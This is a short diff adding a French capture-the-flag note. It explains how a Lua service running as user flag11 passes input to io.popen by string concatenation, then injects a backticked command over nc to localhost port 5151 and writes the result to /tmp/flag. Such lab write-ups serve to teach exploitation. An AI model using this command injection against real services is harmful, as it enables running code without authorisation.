@@ -1,0 +1,9 @@
+# io.popen execute le programe, et vu qu'il y a une concatenation de string, on peux aisement faire executer un programe.
+
+# Quand on lance le script on nous dis qu'il est deja en cours d'execution par flag11
+ps aux | grep lua
+
+nc localhost 5151
+> `getflag` > /tmp/flag
+
+cat /tmp/flag 
